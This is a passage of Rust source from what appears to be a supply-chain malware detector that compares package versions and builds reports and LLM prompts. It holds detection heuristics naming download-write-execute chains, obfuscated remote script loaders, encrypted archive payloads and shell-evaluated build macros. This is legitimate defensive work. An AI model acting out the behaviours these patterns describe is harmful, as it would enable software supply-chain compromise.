                expansion.spec,
            ));
        }
        if let Some(member) = source_download_write_execute_anomaly(
            d,
            self.naming.bump,
            &self.survey.runtime_entrypoints,
        ) {
            lines.push(format!(
                "source execution chain: {member} gained platform-gated HTTP download → file write → process launch",
            ));
        }
        for dependency in &self.deps {
            let detail = dependency.note.as_ref().map_or_else(
                || {
                    if dependency.highlights.is_empty() {
                        "no notable behavior found".to_string()
                    } else {
                        dependency.highlights.join("; ")
                    }
                },
                Clone::clone,
            );
            lines.push(format!(
                "added dependency profile: {} · {} · {}",
                dependency.coord,
                dependency.severity.as_str(),
                detail
            ));
        }
        if restored_endgame_package_shape(d) {
            lines.push(
                "restoration shape: a previously absent declared entrypoint and its large runtime tree returned"
                    .to_string(),
            );
        }
        match self.remediation {
            Some(Remediation::FocusedCleanup) => lines.push(
                "remediation shape: multiple handlers were disabled at function entry and a named artifact is deleted"
                    .to_string(),
            ),
            Some(Remediation::ModelRecovery) => lines.push(
                "remediation shape: model risk fell sharply while attack behavior was removed"
                    .to_string(),
            ),
            Some(Remediation::BehaviorRemoval) => lines.push(
                "remediation shape: high-severity attack behavior was removed without a high-severity replacement"
                    .to_string(),
            ),
            None => {}
        }
        if obfuscated_remote_script_loader(d) {
            lines.push(
                "joined behavior: one file builds text from a long numeric array and injects it as a remote browser script"
                    .to_string(),
            );
        } else if external_remote_script_loader(d) {
            lines.push(
                "joined behavior: one file creates a script element and dynamically loads a literal external host"
                    .to_string(),
            );
        }
        lines.push(format!(
            "deterministic assessment: current {} · new {} · gate: {} · known-bad signatures: {}",
            self.deterministic_verdict.as_str(),
            self.new_verdict.as_str(),
            if self.clean { "pass" } else { "fail" },
            if self.assessment.signature.ids.is_empty() {
                "none matched"
            } else {
                "matched"
            }
        ));
        lines.push(format!(
            "primary deterministic signal: {}",
            self.headline_facts()
        ));

        let mut indicators = Vec::new();
        for file in &d.files {
            let Some(traits) = file.scopes.traits.as_ref() else {
                continue;
            };
            for t in traits
                .added
                .iter()
                .chain(traits.changed.iter().map(|c| &c.new))
            {
                let text = format!("{} {}", t.id, t.desc).to_ascii_lowercase();
                let archive = text.contains("archive")
                    || text.contains("zip")
                    || text.contains("7z")
                    || text.contains("jar");
                let delivery = (archive
                    && (text.contains("encrypt")
                        || text.contains("password")
                        || text.contains("executable member")
                        || text.contains("extension") && text.contains("mismatch")
                        || text.contains("high entropy")))
                    || text.contains("archive-incomplete")
                    || text.contains("malformed") && archive;
                if !delivery {
                    continue;
                }
                let short = crate::rubric::short_name(&t.id);
                indicators.push(format!(
                    "{short}{}{}",
                    if t.desc.is_empty() {
                        String::new()
                    } else {
                        format!(": {}", t.desc)
                    },
                    if t.count > 1 {
                        format!(" (count {})", t.count)
                    } else {
                        String::new()
                    },
                ));
            }
        }
        indicators.sort();
        indicators.dedup();
        indicators.truncate(8);
        if !indicators.is_empty() {
            lines.push(format!("payload indicators: {}", indicators.join(" · ")));
        }
        if self.source_build_anomaly {
            lines.push(if self.source_payload_refresh {
                "source build anomaly: suspicious build loader stayed byte-identical while a compressed test-data carrier changed"
                    .to_string()
            } else {
                "source build anomaly: changed m4 macro discovers source data, transforms a carrier, and evaluates it through the shell"
                    .to_string()
            });
        }

        let mut added_binaries = Vec::new();
        let mut removed_binaries = Vec::new();
        for file in &d.files {
            if !file.path.contains("!!") {
                continue;
            }
            // cleave usually already typed the member from its content; only
            // fall back to extracting it ourselves when it did not. Each
            // extraction re-reads and re-decompresses the whole archive, and
            // this loop runs once per member.
            let detected_type =
                member_type(file).or_else(|| self.member_file_type(&file.path, file.status));
            let is_payload = detected_type.is_some_and(is_compiled_binary_file_type)
                || (detected_type.is_none() && executable_member_layout(&file.path));
            if !is_payload {
                continue;
            }
            match file.status {
                FileStatus::Added => added_binaries.push(file.path.clone()),
                FileStatus::Removed => removed_binaries.push(file.path.clone()),
                FileStatus::Changed => {
                    added_binaries.push(file.path.clone());
                    removed_binaries.push(file.path.clone());
                }
                FileStatus::Unchanged => {}
            }
        }
        added_binaries.sort();
        added_binaries.dedup();
        removed_binaries.sort();
        removed_binaries.dedup();
        for member in added_binaries.iter().take(4) {
            if let Some(old) = removed_binaries
                .iter()
                .find(|old| normalized_member_path(old) == normalized_member_path(member))
            {
                lines.push(format!(
                    "compiled binary member replaced: {} -> {}",
                    display_member_path(old),
                    display_member_path(member)
                ));
            } else {
                lines.push(format!(
                    "compiled binary member added: {}",
                    display_member_path(member)
                ));
            }
        }
        lines
    }

    /// Parsed identity claims are useful context, but deliberately remain
    /// separate from the verdict. The diff carries normalized filefacts
    /// identity on each changed member; show the root claim first and only a
    /// few member claims so a large package cannot drown out behavior.
    pub(crate) fn identity_summary(&self) -> Vec<String> {
        let mut entries: Vec<(usize, String)> = Vec::new();
        for file in &self.judged_diff.files {
            let Some(identity) = meaningful_identity(file) else {
                continue;
            };
            let old = identity
                .old
                .as_ref()
                .map(identity_claims)
                .unwrap_or_default();
            let new = identity
                .new
                .as_ref()
                .map(identity_claims)
                .unwrap_or_default();
            if old.is_empty() && new.is_empty() {
                continue;
            }
            let side = |label: &str, claims: &[String]| {
                if claims.is_empty() {
                    return String::new();
                }
                format!("{label} {}", claims.join(", "))
            };
            let mut text = format!("{}: ", display_member_path(&file.path));
            let old_text = side("old", &old);
            let new_text = side("new", &new);
            if !old_text.is_empty() {
                text.push_str(&old_text);
            }
            if !old_text.is_empty() && !new_text.is_empty() {
                text.push_str(" -> ");
            }
            if !new_text.is_empty() {
                text.push_str(&new_text);
            }
            // The root describes the artifact; member claims provide useful
            // attribution (e.g. a library inside a package) but rank behind it.
            entries.push((usize::from(file.path != "<root>"), text));
        }
        ranked(entries, 6)
    }

    /// Identity claims that actually changed, for the compact terminal view.
    /// The masthead already names the root artifact and version, so repeating
    /// an unchanged `name`, `identifier`, and `version` block adds no context.
    /// Member versions remain eligible because they are not represented there.
    pub(crate) fn identity_change_summary(&self) -> Vec<String> {
        let mut entries: Vec<(usize, String)> = Vec::new();
        for file in &self.judged_diff.files {
            let Some(identity) = meaningful_identity(file) else {
                continue;
            };
            let include_version = file.path != "<root>";
            let old = identity
                .old
                .as_ref()
                .map(|id| identity_claim_fields(id, include_version))
                .unwrap_or_default();
            let new = identity
                .new
                .as_ref()
                .map(|id| identity_claim_fields(id, include_version))
                .unwrap_or_default();
            let priority = usize::from(file.path != "<root>");
            entries.extend(
                changed_identity_claims(display_member_path(&file.path), &old, &new)
                    .into_iter()
                    .map(|line| (priority, line)),
            );
        }
        ranked(entries, 8)
    }

    /// Identify an archive member from its bytes, using the same content-first
    /// filefacts detector as cleave. The diff stores analysis facts but not the
    /// member bytes, so recover them from the root archive when this is a local
    /// comparison. `None` means extraction was unavailable; callers may then
    /// use only a conservative package-layout hint.
    fn member_file_type(&self, path: &str, status: FileStatus) -> Option<filefacts::FileType> {
        let (root, member) = path.split_once("!!")?;
        // A single-file comparison names its one diff entry `<root>`, so it
        // never matches by path — but the lone pair is unambiguously its.
        let sole = match self.pairs.as_slice() {
            [only] => Some(only),
            _ => None,
        };
        let pair = self.pairs.iter().find(|p| p.label == root).or(sole)?;
        let archive = match status {
            FileStatus::Added | FileStatus::Changed => pair.new.as_deref().or(pair.old.as_deref()),
            FileStatus::Removed => pair.old.as_deref().or(pair.new.as_deref()),
            FileStatus::Unchanged => None,
        }?;
        let bytes = cleave::extract_member(archive, member).ok().flatten()?;
        Some(filefacts::FileId::from_bytes(&bytes).file_type())
    }

    /// Build the plain-text payload describing the diff, sent to the LLM (and
    /// shown verbatim by `--format interpret`). No color, no rail — just the
    /// structured behavioral delta plus the matched code/bytes.
    pub(crate) fn llm_context(&self) -> String {
        use std::fmt::Write as _;
        let (a, naming, prop) = (&self.assessment, &self.naming, &self.prop);
        let mut s = String::new();
        let _ = writeln!(s, "artifact: {}", naming.name);
        if let (Some(o), Some(n)) = (&naming.old, &naming.new) {
            let bump = naming
                .bump
                .map(|b| format!(" ({})", b.describe()))
                .unwrap_or_default();
            let _ = writeln!(s, "version: {} -> {}{bump}", o.raw, n.raw);
        }
        if let Some(r) = self.risk {
            let _ = writeln!(s, "ml_malware_probability: {:.2} -> {:.2}", r.old, r.new);
        }
        // Proportionality is an attack prior only for a capability gain. Once
        // executable analysis has proved a focused cleanup, repeating the raw
        // "disproportionate gain" conclusion contradicts the stronger
        // direction-of-change evidence and predictably misleads small models.
        if self.remediation == Some(Remediation::FocusedCleanup) {
            let _ = writeln!(
                s,
                "transition: machine-verified focused remediation (proportionality escalation suppressed)"
            );
        } else if let Some(n) = prop.drift.note() {
            let _ = writeln!(s, "proportionality: {n}");
        }
        if let Some(n) = &prop.skew {
            let _ = writeln!(s, "change shape: {n}");
        }
        s.push_str("\nDIFFERENTIAL SHAPE (high-signal facts):\n");
        for line in self.differential_summary() {
            let _ = writeln!(s, "- {line}");
        }
        s.push_str(
            "\nInterpret the indicators above as a joined differential, not as isolated labels.\n",
        );
        let _ = writeln!(
            s,
            "deterministic gate is {} before any model opinion; a passing gate is not a veto, but package size, ordinary assets, or generic library behavior alone are not grounds to override it.",
            if self.clean { "PASS" } else { "FAIL" }
        );
        if self.remediation == Some(Remediation::FocusedCleanup) {
            s.push_str(
                "focused-remediation proof: at least two changed handlers now have an unconditional return as their first statement, and a new cleanup routine deletes the named attack artifact. Static traits retained below those returns are inactive forensic residue. Classify the transition direction; infer live execution only from a separate reachable path shown in the differential.\n",
            );
        }
        let identities = self.identity_summary();
        if !identities.is_empty() {
            s.push_str("\nCLAIMED IDENTITY (context, not proof):\n");
            for line in identities {
                let _ = writeln!(s, "- {line}");
            }
        }

        let (fresh, expanded): (Vec<_>, Vec<_>) = a
            .behavioral
            .categories
            .iter()
            .partition(|c| a.behavioral.is_new_category(c));
        if !fresh.is_empty() {
            let _ = writeln!(s, "\nNEW capability classes (absent in old version):");
            for c in &fresh {
                let _ = writeln!(
                    s,
                    "- {} [{}]: {} ({} new traits)",
                    c.label,
                    c.severity.as_str(),
                    c.namespaces.join(", "),
                    c.new_ids.len()
                );
            }
        }
        if !expanded.is_empty() {
            let _ = writeln!(
                s,
                "\nEXPANDED capability classes (already present in old version):"
            );
            for c in &expanded {
                let _ = writeln!(
                    s,
                    "- {} [{}]: {} (+{} traits)",
                    c.label,
                    c.severity.as_str(),
                    c.namespaces.join(", "),
                    c.new_ids.len()
                );
            }
        }
        let removed = self.removed_high_risk_behaviors();
        if !removed.is_empty() {
            let _ = writeln!(s, "\nREMOVED high-risk behavior:");
            for group in removed {
                let _ = writeln!(s, "- {}: {}", group.namespace, group.traits.join(", "));
            }
        }
        if a.signature.severity != Severity::None {
            let _ = writeln!(s, "\nknown-bad signatures matched:");
            for m in &a.signature.ids {
                let name = crate::rubric::short_name(&m.id);
                if m.desc.is_empty() {
                    let _ = writeln!(s, "- [{}] {}", m.severity.as_str(), name);
                } else {
                    let _ = writeln!(s, "- [{}] {} — {}", m.severity.as_str(), name, m.desc);
                }
            }
            if let Some(cve) = &a.signature.cve {
                let _ = writeln!(s, "  referenced CVE: {cve}");
            }
        }
        if !a.structure.facts.is_empty() {
            let _ = writeln!(
                s,
                "\nstructural changes (raw binary facts, no rule needed):"
            );
            for f in &a.structure.facts {
                let kind = match f.kind {
                    crate::rubric::FactKind::Added => "new",
                    crate::rubric::FactKind::Became => "became",
                };
                let _ = writeln!(
                    s,
                    "- [{}] {kind} {}: {}",
                    f.severity.as_str(),
                    f.label,
                    f.detail
                );
            }
        }
        if !a.identity.changes.is_empty() {
            let _ = writeln!(s, "\nidentity changes (publisher/signer):");
            for ch in &a.identity.changes {
                let (old, new) = ch.shown();
                let _ = writeln!(s, "- {}: {} -> {}", ch.label, old, new);
            }
        }

        // The distilled top hunks — strongest rule first, one per rule, tiered
        // context — not every match. A broad trait hitting dozens of benign
        // files must not bury the one change that matters (unrealircd's
        // `substr: SYSTEM` read to the model as a false positive when all 30
        // windows were dumped).
        let hunks = self.hunks(crate::evidence::LLM_HUNKS);
        if !hunks.is_empty() {
            let _ = writeln!(
                s,
                "\nchanged code / bytes (top {} matched regions by rule score):",
                hunks.len()
            );
            s.push_str(crate::evidence::render_hunks(&hunks).trim_end());
            s.push('\n');
        }

        // The full source diff for every changed source file — the payload's
        // safety net. The sections above are what the rubric *matched*; a novel
        // attack composed of innocent atoms matches nothing, so without this the
        // model would be asked to judge a change it cannot see. Sub-Notable
        // atoms are named first as reading hints, then the diff itself.
        let changes = self.source_changes();
        if !changes.is_empty() {
            let _ = writeln!(
                s,
                "\nsource diffs (full text of every file whose behavior-bearing traits changed):"
            );
            for c in changes {
                let hints: Vec<&str> = c
                    .atoms
                    .iter()
                    .filter(|at| at.gained && !crate::rubric::is_finding(at.crit))
                    .map(|at| at.desc.as_str())
                    .filter(|d| !d.is_empty())
                    .collect();
                let _ = writeln!(s, "\n--- {} ---", c.label);
                if !hints.is_empty() {
                    let _ = writeln!(s, "(new sub-finding atoms: {})", hints.join("; "));
                }
                s.push_str(c.diff.trim_end());
                s.push('\n');
            }
        }
        s
    }

    /// Suspicious/hostile traits that disappeared, grouped for terminal and
    /// model context. The normal rubric is intentionally gain-oriented for CI;
    /// this supplies the equally important remediation direction.
    pub(crate) fn removed_high_risk_behaviors(&self) -> Vec<RemovedBehavior> {
        let mut groups: BTreeMap<String, Vec<String>> = BTreeMap::new();
        for finding in removed_high_risk_traits(self.display_diff()) {
            let namespace = crate::rubric::namespace_of(&finding.id);
            let leaf = crate::rubric::short_name(&finding.id);
            let traits = groups.entry(namespace).or_default();
            if !traits.contains(&leaf) {
                traits.push(leaf);
            }
        }
        groups
            .into_iter()
            .map(|(namespace, mut traits)| {
                traits.sort();
                RemovedBehavior { namespace, traits }
            })
            .collect()
    }

    /// Build the `--format json` envelope. Compact and typed, mirroring
    /// `../scan`: a curated `verdict` and its evidence beside the full `raw`
    /// cleave diff. See [`crate::json`].
    pub(crate) fn json(&self, cli: &Cli) -> Result<String> {
        use crate::json as j;
        let a = &self.assessment;
        let categories = a
            .behavioral
            .categories
            .iter()
            .map(|c| j::Category {
                class: &c.class,
                label: &c.label,
                severity: c.severity.as_str(),
                new_category: a.behavioral.is_new_category(c),
                namespaces: &c.namespaces,
                new_ids: &c.new_ids,
                escalated_ids: &c.escalated_ids,
            })
            .collect();
        let sig_ids = a
            .signature
            .ids
            .iter()
            .map(|m| j::SigId {
                id: &m.id,
                desc: &m.desc,
                crit: m.severity.as_str(),
                new: m.is_new,
            })
            .collect();
        let facts = a
            .structure
            .facts
            .iter()
            .map(|f| j::Fact {
                severity: f.severity.as_str(),
                change: match f.kind {
                    crate::rubric::FactKind::Added => "added",
                    crate::rubric::FactKind::Became => "became",
                },
                label: f.label,
                detail: &f.detail,
            })
            .collect();
        let changes = a
            .identity
            .changes
            .iter()
            .map(|c| j::IdChange {
                field: c.label,
                old: &c.old,
                new: &c.new,
            })
            .collect();

        // The proof hunks and the full identity claims — everything the UI and
        // the CLI cache need to redraw without re-reading the artifact.
        let hunks = self.hunks(usize::MAX);
        let evidence = hunks
            .iter()
            .map(|h| j::Ev {
                member: h.member.as_deref(),
                location: &h.location,
                severity: h.severity.as_str(),
                desc: &h.desc,
                lines: h
                    .lines
                    .iter()
                    .map(|l| j::EvLine {
                        locator: &l.locator,
                        text: &l.text,
                        added: l.added,
                        is_match: l.is_match,
                    })
                    .collect(),
            })
            .collect();
        let provenance = self
            .diff
            .files
            .iter()
            .find_map(|f| f.identity.as_ref())
            .map_or((None, None), |idd| (idd.old.as_ref(), idd.new.as_ref()));
        let features = feature_set(self.display_diff());

        let envelope = j::Envelope {
            v: "2",
            eng: concat!("isomer/", env!("CARGO_PKG_VERSION")),
            verb: self.verb,
            artifact: (!self.naming.name.is_empty()).then_some(self.naming.name.as_str()),
            version: j::Version {
                old: self.naming.old.as_ref().map(|v| v.raw.as_str()),
                new: self.naming.new.as_ref().map(|v| v.raw.as_str()),
                bump: self.naming.bump.map(Bump::label),
            },
            provenance: j::Provenance {
                old: provenance.0,
                new: provenance.1,
            },
            verdict: j::Verdict {
                severity: self.verdict.as_str(),
                new_severity: self.new_verdict.as_str(),
                gate: j::Gate {
                    on: match cli.gate {
                        Gate::New => "new",
                        Gate::Any => "any",
                    },
                    fail_on: cli.fail_on.as_str(),
                    severity: self.gated.as_str(),
                    fail: !self.clean,
                },
                risk: self.risk.map(|r| j::Risk {
                    old: r.old,
                    new: r.new,
                    delta: r.delta(),
                    model: if self.risk_llm_raised {
                        "azoth+llm"
                    } else {
                        "azoth"
                    },
                }),
                proportionality: j::Prop {
                    disproportionate: self.prop.drift.is_disproportionate(),
                    note: self.prop.drift.note(),
                    skew: self.prop.skew.as_deref(),
                },
                behavioral: j::Behavioral {
                    severity: a.behavioral.severity.as_str(),
                    categories,
                },
                signature: j::Signature {
                    severity: a.signature.severity.as_str(),
                    cve: a.signature.cve.as_deref(),
                    count: a.signature.ids.len(),
                    ids: sig_ids,
                },
                identity: j::Identity {
                    severity: a.identity.severity.as_str(),
                    changes,
                },
                frameworks: j::Frameworks {
                    attack: j::Ids {
                        new: self.survey.attack.gained(),
                        removed: self.survey.attack.lost(),
                        unchanged: self.survey.attack.kept(),
                    },
                    mbc: j::Ids {
                        new: self.survey.mbc.gained(),
                        removed: self.survey.mbc.lost(),
                        unchanged: self.survey.mbc.kept(),
                    },
                },
                structure: j::Structure {
                    severity: a.structure.severity.as_str(),
                    facts,
                },
            },
            features,
            evidence,
            deps: self
                .deps
                .iter()
                .map(|d| j::Dep {
                    coord: &d.coord,
                    ecosystem: d.ecosystem,
                    severity: d.severity.as_str(),
                    highlights: &d.highlights,
                    note: d.note.as_deref(),
                })
                .collect(),
            llm: self.interp.as_ref().map(|i| j::Llm {
                nature: &i.nature,
                verdict: &i.verdict,
                model: &i.model,
            }),
            raw: self.report,
        };
        Ok(serde_json::to_string(&envelope)?)
    }
}

/// Resolve a normalized changed member back to the raw archive paths of its two
/// sides. Version-root normalization can merge a raw Removed+Added pair into a
/// Changed entry, so extraction must recover each side's literal member name.
fn archive_member_pair<'a>(
    raw: &'a DiffReportV1,
    normalized: &FileDiffEntry,
) -> Option<(&'a str, &'a str)> {
    let key = normalized_member_path(&normalized.path);
    // The literal name this member goes by on the side it is not `absent` from
    // — `Added` is the status missing from the old side, `Removed` from the
    // new. Only a lone candidate names a side; several would be a guess.
    let side = |absent: FileStatus| {
        let mut members = raw
            .files
            .iter()
            .filter(|entry| entry.status != absent && normalized_member_path(&entry.path) == key)
            .filter_map(|entry| entry.path.split_once("!!").map(|(_, member)| member))
            .filter(|member| !member.contains('!'));
        let member = members.next()?;
        members.next().is_none().then_some(member)
    };
    Some((side(FileStatus::Added)?, side(FileStatus::Removed)?))
}

/// The bytes of one archive member, or `None` when it cannot be read — an
/// absence is ordinary, a failure is worth a word on stderr.
fn archive_member_bytes(archive: &Path, canonical_member: &str) -> Option<Vec<u8>> {
    for candidate in archive_member_candidates(archive, canonical_member) {
        match cleave::extract_member(archive, &candidate) {
            Ok(Some(bytes)) => return Some(bytes),
            Ok(None) => {}
            Err(error) => {
                eprintln!(
                    "isomer: could not extract {canonical_member} from {}: {error:#}",
                    archive.display()
                );
                return None;
            }
        }
    }
    None
}

/// Candidate literal member paths for Cleave's canonicalized archive path.
/// Source distributions conventionally change `name-version/` between
/// releases; Cleave reports the stable `name/` path, while extraction needs
/// the original root. The archive filename supplies the exact version token.
fn archive_member_candidates(archive: &Path, canonical_member: &str) -> Vec<String> {
    let mut candidates = vec![canonical_member.to_string()];
    let Some(version) = archive
        .file_name()
        .and_then(|name| Version::detect(&name.to_string_lossy()))
    else {
        return candidates;
    };
    let Some((root, suffix)) = canonical_member.split_once('/') else {
        return candidates;
    };
    if Version::detect(root).is_none() {
        candidates.push(format!("{root}-{}/{suffix}", version.raw));
    }
    candidates
}

/// Convert Cleave's complete judged differential into a compact, stable
/// feature record. This intentionally has no display cap: terminal rendering
/// is the only consumer allowed to discard low-importance rows.
fn feature_set(diff: &DiffReportV1) -> crate::json::FeatureSet<'_> {
    use crate::json as j;

    let summary = &diff.summary;
    let compared = summary.files_added
        + summary.files_removed
        + summary.files_changed
        + summary.files_unchanged;
    j::FeatureSet {
        v: "1",
        topology: j::Topology {
            added: summary.files_added,
            removed: summary.files_removed,
            changed: summary.files_changed,
            unchanged: summary.files_unchanged,
            compared,
        },
        scopes: feature_scopes(&diff.scopes),
        files: diff.files.iter().map(file_features).collect(),
    }
}

fn feature_scopes(scopes: &ScopeDiffs) -> crate::json::FeatureScopes {
    crate::json::FeatureScopes {
        traits: scopes.traits.as_ref().map(scope_stats),
        metrics: scopes.metrics.as_ref().map(scope_stats),
        facts: scopes.kv.as_ref().map(scope_stats),
        symbols: scopes.symbols.as_ref().map(scope_stats),
        strings: scopes.strings.as_ref().map(scope_stats),
        sections: scopes.sections.as_ref().map(scope_stats),
    }
}

fn scope_stats<T>(scope: &ScopeDiff<T>) -> crate::json::ScopeStats {
    crate::json::ScopeStats {
        added: scope.added.len(),
        removed: scope.removed.len(),
        changed: scope.changed.len(),
        old_count: scope.old_count,
        new_count: scope.new_count,
        old_weight: scope.old_weight,
        new_weight: scope.new_weight,
        change_weight: scope.change_weight,
        roc: scope.roc,
        truncated: scope.truncated,
    }
}

fn file_features(file: &FileDiffEntry) -> crate::json::FileFeatures<'_> {
    use crate::json as j;

    j::FileFeatures {
        path: &file.path,
        file_type: file.file_type.as_deref(),
        status: file_status(file.status),
        archive_depth: file.path.matches("!!").count(),
        identity_changed: file.identity.as_ref().is_some_and(|id| id.changed),
        scopes: feature_scopes(&file.scopes),
        traits: trait_features(file.scopes.traits.as_ref()),
        metrics: metric_features(file.scopes.metrics.as_ref()),
        facts: fact_features(file.scopes.kv.as_ref()),
        sections: section_features(file.scopes.sections.as_ref()),
    }
}

fn file_status(status: FileStatus) -> &'static str {
    match status {
        FileStatus::Added => "added",
        FileStatus::Removed => "removed",
        FileStatus::Changed => "changed",
        FileStatus::Unchanged => "unchanged",
    }
}

fn trait_side(t: &TraitChange) -> crate::json::TraitSide<'_> {
    crate::json::TraitSide {
        criticality: criticality_name(t.crit),
        confidence: t.conf,
        score: t.crit.score_weight() as f32 * t.conf,
        count: t.count,
        description: &t.desc,
    }
}

fn criticality_name(criticality: cleave::Criticality) -> &'static str {
    match criticality {
        cleave::Criticality::Hostile => "hostile",
        cleave::Criticality::Suspicious => "suspicious",
        cleave::Criticality::Notable => "notable",
        cleave::Criticality::Baseline => "baseline",
        cleave::Criticality::Component => "component",
        cleave::Criticality::Exception => "exception",
        cleave::Criticality::Filtered => "filtered",
    }
}

fn trait_features(scope: Option<&ScopeDiff<TraitChange>>) -> Vec<crate::json::TraitDelta<'_>> {
    use crate::json::TraitDelta;

    let Some(scope) = scope else {
        return Vec::new();
    };
    let mut out = Vec::with_capacity(scope.added.len() + scope.removed.len() + scope.changed.len());
    out.extend(scope.added.iter().map(|t| TraitDelta {
        id: &t.id,
        change: "added",
        old: None,
        new: Some(trait_side(t)),
    }));
    out.extend(scope.removed.iter().map(|t| TraitDelta {
        id: &t.id,
        change: "removed",
        old: Some(trait_side(t)),
        new: None,
    }));
    out.extend(scope.changed.iter().map(|t| TraitDelta {
        id: &t.new.id,
        change: "changed",
        old: Some(trait_side(&t.old)),
        new: Some(trait_side(&t.new)),
    }));
    out
}

fn numeric_delta(old: Option<f64>, new: Option<f64>) -> (Option<f64>, Option<f64>, Option<f64>) {
    let delta = match (old, new) {
        (Some(old), Some(new)) => Some(new - old),
        (None, Some(new)) => Some(new),
        (Some(old), None) => Some(-old),
        (None, None) => None,
    };
    let absolute = delta.map(f64::abs);
    let relative = match (old, new) {
        (Some(old), Some(new)) if old != 0.0 => Some((new - old) / old.abs()),
        _ => None,
    };
    (delta, absolute, relative)
}

fn value_delta<'a>(
    path: &'a str,
    change: &'static str,
    old: Option<&'a serde_json::Value>,
    new: Option<&'a serde_json::Value>,
) -> crate::json::ValueDelta<'a> {
    let (delta, absolute_delta, relative_delta) = numeric_delta(
        old.and_then(serde_json::Value::as_f64),
        new.and_then(serde_json::Value::as_f64),
    );
    crate::json::ValueDelta {
        path,
        change,
        old,
        new,
        delta,
        absolute_delta,
        relative_delta,
    }
}

fn metric_features(scope: Option<&ScopeDiff<MetricChange>>) -> Vec<crate::json::ValueDelta<'_>> {
    let Some(scope) = scope else {
        return Vec::new();
    };
    let mut out = Vec::with_capacity(scope.added.len() + scope.removed.len() + scope.changed.len());
    out.extend(
        scope
            .added
            .iter()
            .map(|m| value_delta(&m.path, "added", None, Some(&m.value))),
    );
    out.extend(
        scope
            .removed
            .iter()
            .map(|m| value_delta(&m.path, "removed", Some(&m.value), None)),
    );
    out.extend(scope.changed.iter().map(|m| {
        value_delta(
            &m.new.path,
            "changed",
            Some(&m.old.value),
            Some(&m.new.value),
        )
    }));
    out
}

fn fact_features(scope: Option<&ScopeDiff<KvChange>>) -> Vec<crate::json::FactDelta<'_>> {
    use crate::json::FactDelta;

    let Some(scope) = scope else {
        return Vec::new();
    };
    let mut out = Vec::with_capacity(scope.added.len() + scope.removed.len() + scope.changed.len());
    out.extend(scope.added.iter().map(|f| FactDelta {
        path: &f.path,
        namespace: &f.namespace,
        change: "added",
        old: None,
        new: Some(&f.value),
    }));
    out.extend(scope.removed.iter().map(|f| FactDelta {
        path: &f.path,
        namespace: &f.namespace,
        change: "removed",
        old: Some(&f.value),
        new: None,
    }));
    out.extend(scope.changed.iter().map(|f| FactDelta {
        path: &f.new.path,
        namespace: &f.new.namespace,
        change: "changed",
        old: Some(&f.old.value),
        new: Some(&f.new.value),
    }));
    out
}

fn section_side(s: &SectionChange) -> crate::json::SectionSide<'_> {
    crate::json::SectionSide {
        size: s.size,
        entropy: s.entropy,
        permissions: s.permissions.as_deref(),
    }
}

fn section_features(
    scope: Option<&ScopeDiff<SectionChange>>,
) -> Vec<crate::json::SectionDelta<'_>> {
    use crate::json::SectionDelta;

    let Some(scope) = scope else {
        return Vec::new();
    };
    let mut out = Vec::with_capacity(scope.added.len() + scope.removed.len() + scope.changed.len());
    out.extend(scope.added.iter().map(|s| SectionDelta {
        name: &s.name,
        change: "added",
        old: None,
        new: Some(section_side(s)),
        size_delta: Some(i128::from(s.size)),
        entropy_delta: None,
    }));
    out.extend(scope.removed.iter().map(|s| SectionDelta {
        name: &s.name,
        change: "removed",
        old: Some(section_side(s)),
        new: None,
        size_delta: Some(-i128::from(s.size)),
        entropy_delta: None,
    }));
    out.extend(scope.changed.iter().map(|s| SectionDelta {
        name: &s.new.name,
        change: "changed",
        old: Some(section_side(&s.old)),
        new: Some(section_side(&s.new)),
        size_delta: Some(i128::from(s.new.size) - i128::from(s.old.size)),
        entropy_delta: Some(s.new.entropy - s.old.entropy),
    }));
    out
}

/// Map an ML malware probability to a severity band (mirrors the risk words:
/// benign / elevated / suspicious / malware).
pub(crate) fn risk_band(p: f32) -> Severity {
    if p >= 0.90 {
        Severity::Critical
    } else if p >= 0.50 {
        Severity::High
    } else if p >= 0.15 {
        Severity::Medium
    } else {
        Severity::None
    }
}

// ── version + naming ────────────────────────────────────────────────────────

/// Detected versions and the artifact name for the header, from the input
/// paths (or explicit `--base-version` / `--head-version`).
#[derive(Debug)]
pub(crate) struct Naming {
    pub name: String,
    pub old: Option<Version>,
    pub new: Option<Version>,
    pub bump: Option<Bump>,
}

impl Naming {
    fn resolve(old: &Path, new: &Path, cli: &Cli, diff: &DiffReportV1) -> Self {
        let ob = basename(old);
        let nb = basename(new);
        // The artifact's own claimed version, when the filename carries none.
        //
        // Two orderings matter here. The root entry describes the artifact
        // itself, so it is asked first — otherwise a vendored library's
        // `package.json` inside the package could name the *package's* version.
        // And an entry that parses both sides is preferred over one that parses
        // only one: a half-parsed claim leaves `bump` as `None`, which switches
        // off every release-pressure detector at once, so a later member that
        // could have answered must not be skipped.
        let claims = |want_both: bool| {
            let mut entries: Vec<&FileDiffEntry> = diff.files.iter().collect();
            entries.sort_by_key(|f| f.path != "<root>");
            entries
                .into_iter()
                .filter_map(|file| file.identity.as_ref())
                .find_map(|identity| {
                    let claimed = |side: &Option<filefacts::Identity>| {
                        side.as_ref()
                            .and_then(|id| id.version.as_ref())
                            .and_then(|claim| Version::from_claim(&claim.value))
                    };
                    let (old, new) = (claimed(&identity.old), claimed(&identity.new));
                    let enough = if want_both {
                        old.is_some() && new.is_some()
                    } else {
                        old.is_some() || new.is_some()
                    };
                    enough.then_some((old, new))
                })
        };
        let (old_claim, new_claim) = claims(true)
            .or_else(|| claims(false))
            .unwrap_or((None, None));
        let ov = cli
            .base_version
            .as_deref()
            .and_then(Version::parse)
            .or_else(|| Version::detect(&ob))
            .or(old_claim);
        let nv = cli
            .head_version
            .as_deref()
            .and_then(Version::parse)
            .or_else(|| Version::detect(&nb))
            .or(new_claim);
        let bump = match (&ov, &nv) {
            (Some(o), Some(n)) => Some(Bump::classify(o, n)),
            _ => None,
        };
        Self {
            name: artifact_name(&nb, &ob, nv.as_ref().or(ov.as_ref())),
            old: ov,
            new: nv,
            bump,
        }
    }
}

/// A path's final component, for naming a file in output. Falls back to the
/// whole path when there is no final component (`/`, or a path ending in `..`).
pub(crate) fn basename(p: &Path) -> String {
    p.file_name()
        .map(|n| n.to_string_lossy().into_owned())
        .unwrap_or_else(|| p.display().to_string())
}

/// A display name: the new file's basename with the detected version token and
/// any archive extension stripped, separators tidied. Falls back to the old
/// basename when the new one empties out or is a content hash (quarantine
/// stores name samples by digest — `13ccd9….sample` is no name for a report).
fn artifact_name(new_base: &str, old_base: &str, ver: Option<&Version>) -> String {
    let new_clean = clean_name(new_base, ver);
    let old_clean = clean_name(old_base, ver);
    // A filename is attacker-chosen — a pull request names its own files, and a
    // package names its own archive — and this lands in the masthead.
    crate::printable(
        if new_clean.is_empty()
